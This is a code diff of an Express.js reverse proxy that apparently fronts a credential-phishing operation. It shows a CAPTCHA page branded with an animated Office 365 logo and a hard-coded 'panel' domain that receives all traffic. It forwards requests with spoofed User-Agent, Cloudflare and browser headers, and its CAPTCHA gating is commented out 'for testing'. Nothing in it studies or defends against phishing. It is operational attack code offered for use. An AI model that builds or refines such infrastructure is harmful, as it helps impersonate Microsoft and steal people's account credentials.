@@ -3,26 +3,23 @@ const cookieParser = require('cookie-parser');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// ⚠️ YOUR PANEL DOMAIN
+// ⚠️ YOUR PANEL DOMAIN (change if different)
 const PANEL_DOMAIN = 'portal42-343.sbs';
 
-// ⚠️ YOUR TURNSTILE SITE KEY (use the one that works)
+// ⚠️ YOUR TURNSTILE SITE KEY (the one that works)
 const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
-// ---------- CAPTCHA PAGE ----------
+// ---------- CAPTCHA PAGE (with animated Office 365 logo) ----------
 app.get('/captcha', (req, res) => {
-    // Get the return path from query, default to '/'
+    // Clean the return path: remove double slashes
     let returnPath = req.query.return || '/';
-    
-    // Clean the path: remove double slashes at the start
     if (returnPath.startsWith('//')) {
         returnPath = returnPath.replace(/^\/+/, '/');
     }
-    // Ensure it starts with a single slash
     if (!returnPath.startsWith('/')) {
         returnPath = '/' + returnPath;
     }
@@ -128,7 +125,6 @@ app.get('/captcha', (req, res) => {
 
     function turnstileCallback(token) {
       if (token) {
-        // Redirect to the cleaned return path
         window.location.href = returnPath;
       }
     }
@@ -158,10 +154,11 @@ app.get('/captcha', (req, res) => {
     `);
 });
 
-// ---------- MIDDLEWARE: redirect to CAPTCHA ----------
+// ---------- CAPTCHA MIDDLEWARE (currently BYPASSED for testing) ----------
+// Uncomment these lines to enable CAPTCHA protection
+/*
 app.use('/l/*', (req, res) => {
     const originalUrl = req.originalUrl;
-    // Ensure the path doesn't have double slashes
     const cleanPath = originalUrl.replace(/^\/+/, '/');
     res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
 });
@@ -171,12 +168,19 @@ app.use('/device/*', (req, res) => {
     const cleanPath = originalUrl.replace(/^\/+/, '/');
     res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
 });
+*/
 
-// ---------- MAIN PROXY ----------
+// ✅ BYPASS: For testing, pass through without CAPTCHA
+app.use('/l/*', (req, res, next) => next());
+app.use('/device/*', (req, res, next) => next());
+
+// ---------- MAIN PROXY (fetches content from your panel) ----------
 app.use('*', async (req, res) => {
     try {
+        // Build the target URL
         const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
         
+        // Prepare headers
         const headers = new Headers(req.headers);
         headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
         headers.delete('host');
@@ -188,6 +192,11 @@ app.use('*', async (req, res) => {
             headers.set('CF-Connecting-IP', clientIp);
         }
 
+        // Add extra headers that Cloudflare expects
+        headers.set('Accept-Language', 'en-US,en;q=0.9');
+        headers.set('Accept-Encoding', 'gzip, deflate, br');
+        headers.set('Cache-Control', 'no-cache');
+
         const opts = {
             method: req.method,
             headers: headers,
@@ -196,14 +205,19 @@ app.use('*', async (req, res) => {
             opts.body = req.body;
         }
 
+        // Fetch from your panel
         const response = await fetch(targetUrl.toString(), opts);
         const body = await response.text();
         const contentType = response.headers.get('content-type') || '';
 
+        // Log the response status for debugging (will appear in Render logs)
+        console.log(`Proxy: ${req.originalUrl} -> ${targetUrl.toString()} status: ${response.status}`);
+
+        // Send the response back to the user
         res.status(response.status).set('Content-Type', contentType).send(body);
     } catch (e) {
         console.error('Proxy error:', e);
-        res.status(500).send('Proxy Error');
+        res.status(500).send('Proxy Error: ' + e.message);
     }
 });
 
